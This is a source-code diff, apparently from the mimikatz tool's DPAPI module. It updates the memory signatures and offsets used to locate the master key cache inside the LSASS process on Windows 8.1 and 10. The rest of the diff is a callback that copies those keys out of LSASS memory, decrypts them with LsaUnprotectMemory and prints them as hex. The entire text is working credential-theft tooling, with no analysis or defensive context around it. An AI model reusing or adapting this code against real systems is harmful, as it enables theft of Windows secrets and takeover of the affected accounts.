@@ -10,15 +10,16 @@ BYTE PTRN_W2K3_MasterKeyCacheList[]	= {0x4d, 0x3b, 0xee, 0x49, 0x8b, 0xfd, 0x0f,
 BYTE PTRN_WI60_MasterKeyCacheList[]	= {0x49, 0x3b, 0xef, 0x48, 0x8b, 0xfd, 0x0f, 0x84};
 BYTE PTRN_WI61_MasterKeyCacheList[]	= {0x33, 0xc0, 0xeb, 0x20, 0x48, 0x8d, 0x05}; // InitializeKeyCache to avoid  version change
 BYTE PTRN_WI62_MasterKeyCacheList[]	= {0x4c, 0x89, 0x1f, 0x48, 0x89, 0x47, 0x08, 0x49, 0x39, 0x43, 0x08, 0x0f, 0x85};
-BYTE PTRN_WI63_MasterKeyCacheList[]	= {0x48, 0x89, 0x07, 0x48, 0x89, 0x4f, 0x08, 0x48, 0x39, 0x48, 0x08, 0x0f, 0x85};
-BYTE PTRN_WI64_MasterKeyCacheList[]	= {0x48, 0x89, 0x06, 0x48, 0x89, 0x4e, 0x08, 0x48, 0x39, 0x48, 0x08, 0x75};
+BYTE PTRN_WI63_MasterKeyCacheList[]	= {0x08, 0x48, 0x39, 0x48, 0x08, 0x0f, 0x85};
+BYTE PTRN_WI64_MasterKeyCacheList[]	= {0x48, 0x89, 0x4e, 0x08, 0x48, 0x39, 0x48, 0x08};
+										 
 KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
 	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_W2K3_MasterKeyCacheList),	PTRN_W2K3_MasterKeyCacheList},	{0, NULL}, {-4}},
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_MasterKeyCacheList),	PTRN_WI60_MasterKeyCacheList},	{0, NULL}, {-4}},
 	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WI61_MasterKeyCacheList),	PTRN_WI61_MasterKeyCacheList},	{0, NULL}, { 7}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI62_MasterKeyCacheList),	PTRN_WI62_MasterKeyCacheList},	{0, NULL}, {-4}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI63_MasterKeyCacheList),	PTRN_WI63_MasterKeyCacheList},	{0, NULL}, {-4}},
-	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WI64_MasterKeyCacheList),	PTRN_WI64_MasterKeyCacheList},	{0, NULL}, {-4}},
+	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI63_MasterKeyCacheList),	PTRN_WI63_MasterKeyCacheList},	{0, NULL}, {-10}},
+	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WI64_MasterKeyCacheList),	PTRN_WI64_MasterKeyCacheList},	{0, NULL}, {-7}},
 };
 #elif defined _M_IX86
 BYTE PTRN_WALL_MasterKeyCacheList[]	= {0x33, 0xc0, 0x40, 0xa3};
@@ -64,9 +65,9 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_
 					{
 						if(RtlEqualLuid(pData->LogonId, &mesCredentials.LogonId))
 						{
-							kprintf(L"\t [%08x]\n\t * GUID :\t", monNb++);
+							kprintf(L"\t [%08x]\n\t * GUID      :\t", monNb++);
 							kull_m_string_displayGUID(&mesCredentials.KeyUid);
-							kprintf(L"\n\t * Time :\t"); kull_m_string_displayLocalFileTime(&mesCredentials.insertTime);
+							kprintf(L"\n\t * Time      :\t"); kull_m_string_displayLocalFileTime(&mesCredentials.insertTime);
 
 							if(aKey.address = LocalAlloc(LPTR, mesCredentials.keySize))
 							{
@@ -74,7 +75,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_
 								if(kull_m_memory_copy(&aKey, &aLsass, mesCredentials.keySize))
 								{
 									(*pData->lsassLocalHelper->pLsaUnprotectMemory)(aKey.address, mesCredentials.keySize);
-									kprintf(L"\n\t * Key :\t"); kull_m_string_wprintf_hex(aKey.address, mesCredentials.keySize, 0);
+									kprintf(L"\n\t * MasterKey :\t"); kull_m_string_wprintf_hex(aKey.address, mesCredentials.keySize, 0);
 								}
 								LocalFree(aKey.address);
 							}
